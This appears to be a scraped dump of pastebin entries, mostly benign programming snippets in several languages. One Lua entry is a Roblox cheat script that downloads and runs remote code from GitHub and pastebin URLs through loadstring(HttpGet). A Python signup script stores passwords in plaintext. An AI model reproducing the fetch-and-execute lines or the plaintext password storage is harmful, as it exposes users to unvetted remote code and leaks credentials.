        nekoEl.style.backgroundImage = ""url('./oneko.gif')"";
        nekoEl.style.imageRendering = ""pixelated"";
        nekoEl.style.left = ""16px"";
        nekoEl.style.top = ""16px"";

        document.body.appendChild(nekoEl);

        document.onmousemove = (event) => {
            mousePosX = event.clientX;
            mousePosY = event.clientY;
        };

        window.onekoInterval = setInterval(frame, 100);
    }

    function setSprite(name, frame) {
        const sprite = spriteSets[name][frame % spriteSets[name].length];
        nekoEl.style.backgroundPosition = `${sprite[0] * 32}px ${
            sprite[1] * 32
        }px`;
    }

    function resetIdleAnimation() {
        idleAnimation = null;
        idleAnimationFrame = 0;
    }

    function idle() {
        idleTime += 1;

        // every ~ 20 seconds
        if (
            idleTime > 10 &&
            Math.floor(Math.random() * 200) == 0 &&
            idleAnimation == null
        ) {
            idleAnimation = [""sleeping"", ""scratch""][
                Math.floor(Math.random() * 2)
            ];
        }

        switch (idleAnimation) {
            case ""sleeping"":
                if (idleAnimationFrame < 8) {
                    setSprite(""tired"", 0);
                    break;
                }
                setSprite(""sleeping"", Math.floor(idleAnimationFrame / 4));
                if (idleAnimationFrame > 192) {
                    resetIdleAnimation();
                }
                break;
            case ""scratch"":
                setSprite(""scratch"", idleAnimationFrame);
                if (idleAnimationFrame > 9) {
                    resetIdleAnimation();
                }
                break;
            default:
                setSprite(""idle"", 0);
                return;
        }
        idleAnimationFrame += 1;
    }

    function frame() {
        frameCount += 1;
        const diffX = nekoPosX - mousePosX;
        const diffY = nekoPosY - mousePosY;
        const distance = Math.sqrt(diffX ** 2 + diffY ** 2);

        if (distance < nekoSpeed || distance < 48) {
            idle();
            return;
        }

        idleAnimation = null;
        idleAnimationFrame = 0;

        if (idleTime > 1) {
            setSprite(""alert"", 0);
            // count down after being alerted before moving
            idleTime = Math.min(idleTime, 7);
            idleTime -= 1;
            return;
        }

        direction = diffY / distance > 0.5 ? ""N"" : """";
        direction += diffY / distance < -0.5 ? ""S"" : """";
        direction += diffX / distance > 0.5 ? ""W"" : """";
        direction += diffX / distance < -0.5 ? ""E"" : """";
        setSprite(direction, frameCount);

        nekoPosX -= (diffX / distance) * nekoSpeed;
        nekoPosY -= (diffY / distance) * nekoSpeed;

        nekoEl.style.left = `${nekoPosX - 16}px`;
        nekoEl.style.top = `${nekoPosY - 16}px`;
    }

    create();
})();"
kBqfVNF1,Untitled,MeehoweCK,C++,Sunday 28th of May 2023 07:54:32 AM CDT,"#include <iostream>

using namespace std;

int main()
{
    int zmienna = 5;
    int& referencja = zmienna;

    cout << ""zmienna: "" << zmienna << endl;
    cout << ""referencja: "" << referencja << endl;

    zmienna++;

    cout << ""zmienna: "" << zmienna << endl;
    cout << ""referencja: "" << referencja << endl;

    referencja *= 5;

    cout << ""zmienna: "" << zmienna << endl;
    cout << ""referencja: "" << referencja << endl;

    return 0;
}"
mkL8q1AK,Muzeu,Patrickmeme,C++,Sunday 28th of May 2023 07:50:38 AM CDT,"#include <fstream>
#include <queue>
using namespace std;

ifstream cin(""muzeu.in"");
ofstream cout(""muzeu.out"");

bool v[251][251];
int min1[251][251];

int ml[]={1,0,-1,0};
int mc[]={0,1,0,-1};

int main()
{
    int n,i,j,l,c,cntd;
    char ch;
    cin>>n;
    queue<pair<int,int>>deMers;
    queue<int>cnt;
    for(i=1;i<=n;i++){
        for(j=1;j<=n;j++){
            min1[i][j]=9999999;
            cin>>ch;
            if(ch=='#'){
                v[i][j]=1;
            }else if(ch=='P'){
                min1[i][j]=0;
                deMers.push({i,j});
                cnt.push(0);
            }
        }
    }
    while(!deMers.empty()){
        pair<int,int>poz=deMers.front();
        cntd=cnt.front()+1;
        deMers.pop();
        cnt.pop();
        for(j=0;j<4;j++){
            l=poz.first+ml[j];
            c=poz.second+mc[j];
            if(l<=n && c<=n && l>0 && c>0 && v[l][c]!=1 && cntd<min1[l][c]){
                min1[l][c]=cntd;
                cnt.push(cntd);
                deMers.push({l,c});
            }
        }
     }

    for(i=1;i<=n;i++){
        for(j=1;j<n;j++){
            if(v[i][j]==1)
                cout<<""-2 "";
            else if(min1[i][j]==9999999)
                cout<<""-1 "" ;
            else
                cout<<"" ""<<min1[i][j]<<"" "";
        }
        if(v[i][j]==1)
            cout<<""-2 "";
        else if(min1[i][j]==9999999)
            cout<<""-1 "" ;
        else
            cout<<"" ""<<min1[i][j];
        cout<<""\n"";
    }
    return 0;
}
"
VJTtmzew,Untitled,MeehoweCK,C++,Sunday 28th of May 2023 07:48:41 AM CDT,"#include <iostream>

using namespace std;

/*Co musi posiadać każda zmienna?
+ typ
+ wartość
+ nazwę
+ adres w pamięci
*/

int main()
{
    int* wskaznik;      // zdefiniowanie wskaźnika na typ int - czyli zmiennej, która przechowuje adres komórki pamięci, w której przechowywana jest zmienna typu int

    int liczba = 10;
    wskaznik = &liczba;     // znak & przed nazwą zmiennej pobiera adres komórki, w której dana zmienna jest zapisana. Taki adres może być przechowywany we wskaźniku

    cout << liczba << endl;         // aktualna wartość zmiennej liczba (10)
    cout << wskaznik << endl;       // aktualna wartość zmiennej wskaźnik, czyli adres komórki pamięci, w której przechowywana jest zmienna liczba
    cout << &liczba << endl;        // adres komórki pamięci, w której przechowywana jest zmienna liczba
    cout << *wskaznik << endl;      // wartość, która znajduje się pod adresem komórki będącym aktualną wartością wskaźnika (10)
    cout << &wskaznik << endl;      // adres komórki pamięci, w której przechowywana jest zmienna wskaźnik

    return 0;
}"
P5Yy8RhZ,Софа деревья,Technoblade777,C++,Sunday 28th of May 2023 07:43:31 AM CDT,"#include <iostream>
using namespace std;

//создаем стрктуру дерева
struct tree{
    int info;
    tree *right, *left;
};

//фукнция дерева
void add_node(tree *node, int n)
{
    if(n<node->info)
    {
        if(node->left==NULL)
        {
            tree *r = new tree;
            r->info = n;
            node->left = r;
        }
        else{add_node(node->left, n);}
    }
    else
    {
        if(node->right==NULL)
        {
            tree *r = new tree;
            r->info = n;
            node->right = r;
        }
        else{add_node(node->right, n);}
    }
}

void LNR(tree *node)
{
    if(node==NULL){return;}
    else
    {
        LNR(node->left);
        cout << node->info << "" "";
        LNR(node->right);
    }
}
int main()
{
    int n;
    cout << ""Введите длину массива: ""; cin>>n;
    int *a = new int[n];
    for(int i = 0; i < n; i++)
    {
        cin >> a[i];
    }

    //объявляем корень дерева
    tree *root = new tree;
    int x;
    int i = 0;
    //проверка корневого элемента на четность
    while(i!=n)
    {
        if(a[i]%2==0){x=a[i]; break;}
        i++;
        if(i==n){cout<<""В исходном массиве отсутствуют четные числа""; return 0;}
    }
    root->left = NULL; root->right = NULL;
    root->info = x;
    i++;

    //проверка остальной части элементов массива на четность
    while(i<n)
    {
        x = a[i];
        if(x%2==0){add_node(root, x);}
        i++;
    }

    //вывод в отсортированном виде
    LNR(root);

    return 0;
}




"
pr2UCvUs,Untitled,MeehoweCK,C++,Sunday 28th of May 2023 07:36:09 AM CDT,"#include <iostream>
#include <fstream>
#include <vector>

using namespace std;

// struktura - składnia:
struct Student     // Student od tego momentu jest nazwą naszego własnego typu zmiennej
{
    string imie;
    string nazwisko;
    int wiek;
    string e_mail;
    double srednia_ocen;
};

ostream& operator<<(ostream& out, const Student& student)
{
    out << student.imie << ' ' << student.nazwisko << "" (adres e-mail: "" << student.e_mail << ""), wiek "" << student.wiek << "" lat, srednia ocen: "" << student.srednia_ocen;
    return out;
}

istream& operator>>(istream& in, Student& student)
{
    in >> student.imie >> student.nazwisko >> student.wiek >> student.e_mail >> student.srednia_ocen;
    return in;
}

bool pobranie_danych(vector<Student>& tablica)
{
    ifstream plik_in;
    plik_in.open(""dane_studentow.txt"");
    if (plik_in.fail())
        return 1;       // zwrócenie błędu

    do
    {
        Student temp;
        plik_in >> temp;
        tablica.push_back(temp);        // dodanie elementu na koniec wektora
    } while (!plik_in.eof());           // eof - end of file

    plik_in.close();
    return 0;       // zwrócenie braku błędu
}

int main()
{
    vector<Student> t;
    if (pobranie_danych(t))
    {
        cout << ""Nie udalo sie odczytac danych z pliku. Nastapi zamkniecie programu.\n"";
        return 0;
    }

    for (auto student : t)      // zakresowa pętla for
    {
        cout << student << endl;
    }


    return 0;
}"
vU4WauEb,Untitled,Don_Mag,Swift,Sunday 28th of May 2023 07:32:19 AM CDT,"// IBDesignable button

@IBDesignable
class MyButton: UIButton {
	
	override func setTitle(_ title: String?, for state: UIControl.State) {
		let t = ""++ \(title ?? """") ++""
		super.setTitle(t, for: state)
	}
	
}
"
39uAYBhV,Untitled,MeehoweCK,C++,Sunday 28th of May 2023 07:26:21 AM CDT,"#include<iostream>
#include<fstream>
using namespace std;

// struktura - składnia:
struct Student     // Student od tego momentu jest nazwą naszego własnego typu zmiennej
{
    string imie;
    string nazwisko;
    int wiek;
    string e_mail;
    double srednia_ocen;
};

ostream& operator<<(ostream& out, const Student& student)
{
    out << student.imie << ' ' << student.nazwisko << "" (adres e-mail: "" << student.e_mail << ""), wiek "" << student.wiek << "" lat, srednia ocen: "" << student.srednia_ocen;
    return out;
}

istream& operator>>(istream& in, Student& student)
{
    in >> student.imie >> student.nazwisko >> student.wiek >> student.e_mail >> student.srednia_ocen;
    return in;
}

bool plik_danych(Student t[5])
{

    ifstream plik_in;
    plik_in.open(""dane_studentow.txt"");
    if (plik_in.fail())
        return 1;       // zwrócenie błędu
    for (int i = 0; i < 5; i++)
    {
        plik_in >> t[i];
    }

    plik_in.close();
    return 0;       // zwrócenie braku błędu
}

int main()
{

    Student t[5];
    if (plik_danych(t))
    {
        cout << ""Nie udalo sie odczytac danych z pliku. Nastapi zamkniecie programu.\n"";
        return 0;
    }

    for (int i = 0; i < 5; i++)
    {
        cout << t[i] << endl;
    }


    return 0;
}"
9kW9pQF4,ExtractData_Site_2-Array.php,noam76,PHP,Sunday 28th of May 2023 07:26:02 AM CDT,"<?php
require '../vendor/autoload.php';

use GuzzleHttp\Client;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PHPHtmlParser\Dom;

$idStrings = ['3853', '3861', '3855']; // Replace with your desired IDs

$client = new Client();
$spreadsheet = new Spreadsheet();
$sheet = $spreadsheet->getActiveSheet();

foreach ($idStrings as $id) {
    $res = $client->request('GET', 'https://www.duurzaamloket.nl/SolKey_X014/Spec_Collector.php?ID='. $id .'&SchemeNo=0&Offset=1&SearchText=&PageCnt=500');

    $dom = new DOMDocument();
    @$dom->loadHTML($res->getBody());

    $divs = $dom->getElementsByTagName('div');

    foreach ($divs as $div) {
        $id = $div->getAttribute('id');
        if ($id == 'tblTestResults_1') {
            $tables = $div->getElementsByTagName('table');
            foreach ($tables as $table) {
                $class = $table->getAttribute('class');
                if ($class == 'LicDetails') {
                    $rows = $table->getElementsByTagName('tr');
                    foreach ($rows as $row) {
                        $cols = $row->getElementsByTagName('td');
                        $rowValues = [];
                        foreach ($cols as $col) {
                            $rowValues[] = trim($col->nodeValue);
                        }
                        if (!empty($rowValues)) {
                            $sheet->fromArray($rowValues, null, 'A' . $sheet->getHighestRow()+1);
                        }
                    }
                }
            }
        }
    }
}

$writer = IOFactory::createWriter($spreadsheet, 'Xlsx');
$writer->save('tabledetails1.xlsx');
?>"
xw0J1Jij,signup.py,DrAungWinHtut,Python,Sunday 28th of May 2023 07:21:44 AM CDT,"import os


def Signup():
    print('===Signup===\n')

    # To Ask and check username, if exists ask again
    while True:
        uname = input('Username: ')
        fname = uname + '.dat'
        if not ' ' in uname:
            if os.path.exists(fname):
                print('User already exists, pls try another Username!')
                continue

            else:
                break
        else:
            print('SPACE in Username, please try again!')
            continue

    # To Ask password and check it
    while True:
        password = input('Password: ')
        confirm_password = input('Confirm Password: ')
        if password == confirm_password:
            break
        else:
            print('Passwords do not match, pls try again!')

    # Open file and Save password
    file = open(fname, 'w')
    file.write(password)
    file.close()
    print(f'Signup user {uname} Successfully')


def Signin():
    print('===Signin===\n')
    uname = input('Username: ')
    password = input('Password: ')
    fname = uname + '.dat'

    # check if username is OK
    if not os.path.exists(fname):
        print(f'Username {uname} does not exists')
        ans = input('Signup? (y\\n): ')
        if ans.lower() == 'y':
            Signup()
        else:
            exit()
    # check if password is OK
    else:
        file = open(fname, 'r')
        password_in_file = file.read().rstrip()
        file.close()
        if password == password_in_file:
            print('Signin Successfully...')
            # Call fun from here
        else:
            print('wrong password,exiting...')


# Program Start Here
if __name__ == '__main__':
    Signin()"
2uWPSdsr,dovi load local,vpeter,Bash,Sunday 28th of May 2023 07:07:38 AM CDT,"diff --git a/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/dovi-loader.sh b/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/dovi-loader.sh
index 7ecf091606..4e4b278222 100755
--- a/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/dovi-loader.sh
+++ b/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/dovi-loader.sh
@@ -5,10 +5,21 @@
 # get coreelec release information
 source /etc/os-release
 
+DOVI_KO_LOCAL=""/storage/.config/dovi.ko""
+
 message() {
   >&2 echo ""${@}""
 }
 
+load_dovi_local() {
+  modinfo ${DOVI_KO_LOCAL}
+  insmod  ${DOVI_KO_LOCAL}
+}
+
+cleanup_dovi_local() {
+  rmmod dovi 2>/dev/null
+}
+
 load_dovi_ne() {
   # if mounted from tee-loader don't mount/unmount from dovi-loader
   if ! ls /dev/mapper/dynpart-* &>/dev/null; then
@@ -55,14 +66,20 @@ cleanup_dovi_ng() {
   mountpoint -q /android/vendor && umount /android/vendor
 }
 
-message ""run ${1} for ${COREELEC_DEVICE:8:2}""
+if [ -f ${DOVI_KO_LOCAL} ]; then
+  load_type=local
+else
+  load_type=${COREELEC_DEVICE:8:2}
+fi
+
+message ""run ${1} for ${load_type}""
 
 case ""${1}"" in
   start)
-    load_dovi_${COREELEC_DEVICE:8:2}
+    load_dovi_${load_type}
     ;;
   stop)
-    cleanup_dovi_${COREELEC_DEVICE:8:2}
+    cleanup_dovi_${load_type}
     ;;
 esac
 
"
56Lv8Kpn,service function,magrega,TypeScript,Sunday 28th of May 2023 06:57:59 AM CDT,"import { TStories, TStory } from '../App.types';

const _api = 'https://lobster-app-qoium.ondigitalocean.app/story/';
let initialRequest = '?offset=0&limit=15';

export const fetchData = async (url: string, method: string = 'GET', body?: string): Promise<any> => {
  try {
    const options: RequestInit = { method, headers: { 'Content-Type': 'application/json' } };

    if (body) options.body = body;

    const response = await fetch(url, options);

    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);

    return response.json();
  } catch (e) {
    throw new Error(`Error fetching data: ${(e as Error).message}`);
  }
};

export const getPosts = async (req: string = initialRequest): Promise<TStories> => {
  try {
    const responseBody = await fetchData(`${_api}${req}`);
    initialRequest = responseBody.next_url.replace('/story/', '');
    return responseBody;
  } catch (e) {
    throw new Error(`Error fetching posts: ${(e as Error).message}`);
  }
};

export const getPost = async (id: string): Promise<TStory> => {
  try {
    return fetchData(`${_api}${id}`);
  } catch (e) {
    throw new Error(`Error getting post: ${(e as Error).message}`);
  }
};

export const sendPost = async (body: string): Promise<TStory> => {
  try {
    return await fetchData(_api, 'POST', JSON.stringify({ content: body }));
  } catch (e) {
    throw new Error(`Error making a post: ${(e as Error).message}`);
  }
};
"
nXPx5WRF,Untitled,codhank,JavaScript,Sunday 28th of May 2023 06:57:46 AM CDT,"import {
  User,
  Role,
  UserInformation,
  UserPreference,
} from ""../database/sequelize/index.js"";

export default {
  async getCurrentUser(req, res, next) {
    try {
      const user = await User.findOne({
        where: { id: req.userId },
        include: [
          { model: Role },
          { model: UserInformation, as: ""userInformation"" },
          { model: UserPreference, as: ""userPreference"" },
        ],
      });

      console.log(""User found in userController:"", user);
      if (!user) {
        return res.status(404).json({ message: ""User not found"" });
      }

      res.status(200).json(user);
    } catch (error) {
      console.error(error);
      next(error);
    }
  },


  async updateUserProfilePic(req, res, next) {
    try {
      const user = await User.findOne({
        where: { id: req.userId },
      });

      const userInformation = await UserInformation.findOne({
        where: { userId: req.userId },
      });

      if (!user || !userInformation) {
        return res.status(404).send({ message: ""User not found"" });
      }

      userInformation.profilePicture = `/uploads/${req.file.filename}`;

      await userInformation.save();

      res.status(200).json({
        message: ""Profile picture updated successfully"",
        user: user,
      });
    } catch (error) {
      console.error(error);
      next(error);
    }
  },

  async updateUserInfo(req, res, next) {
    try {
      const { username, email, address, phoneNumber, profilePicture } =
        req.body;

      // Mettre à jour l'utilisateur
      const user = await User.findOne({
        where: { id: req.userId },
      });

      if (!user) {
        return res.status(404).send({ message: ""User not found"" });
      }

      user.username = username;
      user.email = email;

      await user.save();

      // Mettre à jour les informations utilisateur
      const userInformation = await UserInformation.findOne({
        where: { userId: req.userId },
      });

      if (!userInformation) {
        return res.status(404).send({ message: ""User information not found"" });
      }

      userInformation.address = address;
      userInformation.phoneNumber = phoneNumber;
      userInformation.profilePicture = profilePicture;

      await userInformation.save();

      // Récupérer l'utilisateur avec les informations mises à jour
      const updatedUser = await User.findOne({
        where: { id: req.userId },
        include: [
          { model: Role },
          { model: UserInformation, as: ""userInformation"" },
        ],
      });

      res.status(200).json({
        message: ""User information updated successfully"",
        user: updatedUser,
      });
    } catch (error) {
      console.error(error);
      next(error);
    }
  },

  // Récupere les preferences de l'utilisateur
  async getUserPreferences(req, res, next) {
    try {
      const userPreference = await UserPreference.findOne({
        where: { userId: req.userId },
      });
  
      if (!userPreference) {
        return res.status(404).json({ message: ""User preferences not found"" });
      }
  
      res.status(200).json(userPreference);
    } catch (error) {
      console.error(error);
      next(error);
    }
  },
  

  async updateUserPreferences(req, res, next) {
    console.log(""Request reached to updateUserPreferences controller"");
    //TODO: gérer region, fishingType, et favouriteSpecies
    try {
      const { fishingLevel, hasFishingCard } = req.body;
  
      // Trouver ou créer les préférences utilisateur
      let [userPreference, created] = await UserPreference.findOrCreate({
        where: { userId: req.userId },
        defaults: {
          fishingLevel: fishingLevel,
          hasFishingCard: hasFishingCard,
        },
      });
  
      // Si les préférences de l'utilisateur existent déjà, mettez-les à jour
      if (!created) {
        userPreference.fishingLevel = fishingLevel;
        userPreference.hasFishingCard = hasFishingCard;
  
        await userPreference.save();
      }
  
      res.status(200).json({
        message: ""User preferences updated successfully"",
        userPreference: userPreference,
      });
    } catch (error) {
      console.error(error);
      next(error);
    }
  },  
};
"
qiuPFq8n,Untitled,Mysoft,C,Sunday 28th of May 2023 06:38:18 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include ""TNCremoLib.h""

int main()
{
    // Establish connection to the TNC 640
    int connection = ConnectToTNC(""192.168.1.100""); // Replace with the IP address of your TNC 640

    if (connection == 0)
    {
        printf(""Connection to TNC 640 successful.\n"");

        // Send a command to move the X-axis by 100 units
        int result = SendNCCommand(""X 100"");

        if (result == 0)
        {
            printf(""Command sent successfully.\n"");
        }
        else
        {
            printf(""Failed to send command.\n"");
        }

        // Disconnect from the TNC 640
        DisconnectFromTNC();
        printf(""Disconnected from TNC 640.\n"");
    }
    else
    {
        printf(""Connection to TNC 640 failed.\n"");
    }

    return 0;
}"
LiRLp2Rv,+1 Strong Every Second 💪,LuaXe,Lua,Sunday 28th of May 2023 06:29:00 AM CDT,"if not game.workspace:FindFirstChild(""PFA"") then local part = Instance.new(""Part"") part.Name = ""PFA"" part.Parent = game.workspace part.CFrame = CFrame.new(3, 880, 135) part.Size = Vector3.new(100, 1, 100) part.CanCollide = true part.Transparency = 0.8 part.Anchored = true end
if game.workspace:FindFirstChild(""Products"") then game.workspace.Products:Destroy() end

function C()
    spawn(function () TPCFrame(CFrame.new(3966, 923, -40)) wait(0.2) TPCFrame(game:GetService(""Workspace"").Box.Torba.Root.CFrame) wait(0.2)
        while getgenv().C do
if game:GetService(""Players"").LocalPlayer.Backpack:FindFirstChild(""Yumruk"") then game:GetService(""Players"").LocalPlayer.Backpack.Yumruk.Parent = game:GetService(""Players"").LocalPlayer.Character end
fireproximityprompt(game:GetService(""Workspace"").Box.Torba[""Box thing""].ProximityPrompt)
game:GetService(""Players"").LocalPlayer.Character.Yumruk.Punch.RemoteEvent:FireServer() wait()
        end wait(0.2) if not game:GetService(""Players"").LocalPlayer.Backpack:FindFirstChild(""Yumruk"") then game:GetService(""ReplicatedStorage"").Events.Box:FireServer() end
    end)
    spawn(function ()
        for i, v in pairs(game:GetService(""Workspace"").Map:GetChildren()) do if v.DataCost == 28 then v.Transparency = 0.9 v.CanCollide = false end end wait(1)
        while getgenv().C do
            TPCFrame(CFrame.new(3, 885, 135)) wait()
        end
    end)
end
function R()
    spawn(function ()
        while getgenv().R do
local args = {[1] = true}game:GetService(""ReplicatedStorage"").Events.Rebirth:FireServer(unpack(args)) wait()
        end
    end)
end
function H(W)
    spawn(function ()
        while getgenv().H do
TPCFrame(game:GetService(""Workspace"").Pet[W].Interact) fireproximityprompt(game:GetService(""Workspace"").Pet[W].Interact.Single.CFrame) wait()
        end
    end)
end

local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()

local w = library:CreateWindow(""+1 Strong every sec"")

local b = w:CreateFolder(""Main"")

b:Button(""TP To The Game"",function() game:GetService(""TeleportService""):Teleport(11298617267) end)

b:Toggle(""Inf. Strength"",function(val)
getgenv().C = val
C()
end)

b:Toggle(""Inf. Rebirth"",function(val)
getgenv().R = val
R()
end)

b:Toggle(""Auto Hatch"",function(val)
getgenv().H = val
H(W)
end)

b:Dropdown(""Choose An Egg"",{""World 1"",""World 2"",""World 3"",""World 4"",""World 5"",""World 6"",""World 7"",""Christmas""},true,function(val)
W = val
end)

b:Label(""Made by X_LuaF#0705"",{TextSize = 21; TextColor = Color3.fromRGB(255,255,255); BgColor = Color3.fromRGB(38, 38, 38);})

local w = library:CreateWindow(""LocalPlayer"")

local b = w:CreateFolder(""LP"")

b:DestroyGui()

b:Button(""Discord"",function() setclipboard(""workink.co/2GQ/LTD"") end)
b:Button(""Full Version"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/GphZf9Xe"", true))() end)
b:Button(""Rejoin"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/mM7JBG5h"", true))() end)
b:Button(""Reset"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/EEY6SATj"", true))() end)

b:Box(""Speed"",""number"",function(val) S = val end)
b:Box(""Jump"",""number"",function(val) J = val end)
b:Box(""Hip Height"",""number"",function(val) H = val end)
b:Box(""Gravity"",""number"",function(val) G = val end)
 
b:Toggle(""Speed"",function(bool) getgenv().Speed = bool Speed(S) end)
b:Toggle(""Jump"",function(bool) getgenv().Jump = bool Jump(J) end)
b:Toggle(""Hip Height"",function(bool) getgenv().Hip = bool Hip(H) end)
b:Toggle(""Gravity"",function(bool) getgenv().Grav = bool Grav(G) end)
 
b:Slider(""FOV (Default is 70)"",{min = 0;max = 120;precise = true;},function(val) game.workspace.CurrentCamera.FieldOfView = val end)

function TPCFrame(Player_CFrame) if game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player_CFrame end end
function PHP(Player_HP) game.Players.LocalPlayer.Character.Humanoid.Health = Player_HP end

function Chat(Mes, Freq) spawn(function () while getgenv().Chat do local args = {[1] = Mes,[2] = ""All""} game:GetService(""ReplicatedStorage"").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args)) wait(Freq) end end) end
function Speed(Nume) spawn(function () while getgenv().Speed do game:GetService(""Players"").LocalPlayer.Character.Humanoid.WalkSpeed = Nume if not getgenv().Speed then game:GetService(""Players"").LocalPlayer.Character.Humanoid.WalkSpeed = 16 end wait() end end) end
function Jump(Nume) spawn(function () while getgenv().Jump do game:GetService(""Players"").LocalPlayer.Character.Humanoid.JumpPower = Nume if not getgenv().Jump then game:GetService(""Players"").LocalPlayer.Character.Humanoid.JumpPower = 50 end wait() end end) end
function Hip(Nume) spawn(function () while getgenv().Hip do game:GetService(""Players"").LocalPlayer.Character.Humanoid.HipHeight = Nume if not getgenv().Hip then game:GetService(""Players"").LocalPlayer.Character.Humanoid.HipHeight = 0.1 end wait() end end) end
function Grav(Nume) spawn(function () while getgenv().Grav do game:GetService(""Workspace"").Gravity = Nume if not getgenv().Grav then game:GetService(""Workspace"").Gravity = 196.2 end wait() end end) end"
DLf2frNm,Untitled,Antonderman,Lua,Sunday 28th of May 2023 06:23:33 AM CDT,"--- Super Magic for certus quartz mining, don't mind it
 
local machineId = os.getComputerID()
os.setComputerLabel(""QuartzMiner-ID""..machineId)
 
print(""Super Quartz Miner for Turtles 10000 is up and running."")
 
while true do
  local successfulFront, dataFront = turtle.inspect()
  
  if successfulFront then
      if dataFront.name == ""elementalcraft:springaline_cluster"" then
        print(""quartz detected"")
        turtle.dig()
      end
  end
 
  local successfulUp, dataUp = turtle.inspectUp()
  
  if successfulUp then
      if dataUp.name == ""elementalcraft:springaline_cluster"" then
        print(""quartz detected"")
        turtle.digUp()
      end
  end
 
  local successfulDown, dataDown = turtle.inspectDown()
  
  if successfulDown then
      if dataDown.name == ""elementalcraft:springaline_cluster"" then
        print(""quartz detected"")
        turtle.digDown()
      end
  end
  
  os.sleep(1)
end"
yWBatt73,Untitled,35657,C++,Sunday 28th of May 2023 06:14:08 AM CDT,"
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <string.h>

using namespace std;

struct contact {
	char name[100];
	char mobile_phone[20];
	char home_phone[20];
	char work_phone[20];
};

class phone_book {

public:

	phone_book() {
		store = new contact * [100];
		contacts_number = 0;
		max_contacts_number = 100;
	}

	phone_book(int max_number) {
		store = new contact * [max_number];
		contacts_number = 0;
		max_contacts_number = max_number;
	}

	phone_book(contact arr[], int arr_size) {
		store = new contact * [100];
		max_contacts_number = 100;
		for (int i = 0; i < arr_size; ++i) {
			AddContact(arr[i].name, arr[i].mobile_phone, arr[i].home_phone, arr[i].work_phone);
		}
	}

	void ShowAllContacts() {
		cout << ""The following contacts are available: "" << endl;
		if (contacts_number == 0) {
			cout << ""No contacts"";
		}
		for (int i = 0; i < contacts_number; ++i) {
			cout << '\""' << store[i]->name << ""\"", mobile_phone: "" << store[i]->mobile_phone << "", home_phone: "" << store[i]->home_phone << "", work_phone: "" << store[i]->work_phone << endl;
		}
		cout << endl;
	}

	void AddContact(const char name[], const char mobile_phone[], const char home_phone[], const char work_phone[]) { // не забывать ставить const, иначе не скомпилируется
		if (contacts_number == max_contacts_number) {
			cout << ""The contact cannot be added"" << endl;
			return;
		}
		store[contacts_number] = new contact{};
		strcpy(store[contacts_number]->name, name);
		strcpy(store[contacts_number]->mobile_phone, mobile_phone);
		strcpy(store[contacts_number]->home_phone, home_phone);
		strcpy(store[contacts_number]->work_phone, work_phone);
		contacts_number++;
	}

	void DelContact(const char name[]) {
		for (int i = 0; i < contacts_number; i++) {
			if (!strcmp(store[i]->name, name)) { // возвращает 0 если строки одинаковые, поэтому используем ! (чтобы возврат нуля означал ""истину"")
				delete store[i];
				for (int j = i; j < contacts_number - 1; j++) {
					store[j] = store[j + 1];
				}
				store[contacts_number - 1] = nullptr;
				contacts_number--;
			}
		}
	}

	void FindContactName(const char name[]) {
		cout << ""Found according to your request: "" << endl;
		for (int i = 0; i < contacts_number; i++) {
			if (!strcmp(store[i]->name, name)) {
				cout << '\""' << store[i]->name << ""\"", mobile_phone: "" << store[i]->mobile_phone << "", home_phone: "" << store[i]->home_phone << "", work_phone: "" << store[i]->work_phone << endl;
			}
		}
		cout << endl;
	}

	~phone_book() {
		for (int i = 0; i < contacts_number; ++i) {
			delete store[i];
		}
		delete[] store;
	}

private:
	contact** store;
	int contacts_number;
	int max_contacts_number;

};


int main() { // для проверки функционала

	phone_book my_store; // для проверки конструктора по умолчанию

	//phone_book my_store(50); // для проверки конструктора для одного параметра

	//contact some_contacts[]{ {""Ivan"", ""+79111111111"", ""111111"", ""121212""}, {""Zhenya"", ""+79111111333"", ""111133"", ""121233""}}; // для проверки конструктора для двух параметров (закомментировать первые два добавления контакта)

	//phone_book my_store(some_contacts, 2); // для проверки конструктора для двух параметров

	my_store.AddContact(""Ivan"", ""+79111111111"", ""111111"", ""121212"");
	my_store.AddContact(""Zhenya"", ""+79111111333"", ""111133"", ""121233"");
	my_store.AddContact(""Galya"", ""+79115511333"", ""166133"", ""127733"");
	my_store.AddContact(""Olya"", ""+79115511333"", ""166133"", ""127733"");

	my_store.ShowAllContacts();

	my_store.DelContact(""Zhenya"");

	my_store.ShowAllContacts();

	my_store.AddContact(""Zhenya"", ""+79111111333"", ""111133"", ""121233"");

	my_store.FindContactName(""Galya"");

}
"
zukKq1nK,Untitled,Generic01,Bash,Sunday 28th of May 2023 06:11:40 AM CDT,"➜  vayu-kernel git:(main) ✗ make O=out ARCH=arm64 vayu_defconfig
make[1]: вход в каталог «/home/yaroslav/Документы/vayu-kernel/out»
  HOSTCC  scripts/basic/fixdep
  HOSTCC  scripts/basic/bin2c
  GEN     ./Makefile
  HOSTCC  scripts/kconfig/conf.o
  HOSTCC  scripts/kconfig/zconf.tab.o
  HOSTLD  scripts/kconfig/conf
#
# configuration written to .config
#
make[1]: выход из каталога «/home/yaroslav/Документы/vayu-kernel/out»
➜  vayu-kernel git:(main) ✗ make -j$(nproc --all) O=out ARCH=arm64 CC=/home/yaroslav/Документы/build-tools/clang/clang-r487747c/bin/clang CLANG_TRIPLE=/home/yaroslav/Документы/build-tools/aarch64-linux-gnu/bin/aarch64-linux-gnu- CROSS_COMPILE=/home/yaroslav/Документы/build-tools/aarch64-linux-android/bin/aarch64-linux-android-
make[1]: вход в каталог «/home/yaroslav/Документы/vayu-kernel/out»
  GEN     ./Makefile
scripts/kconfig/conf  --silentoldconfig Kconfig
  CHK     include/config/kernel.release
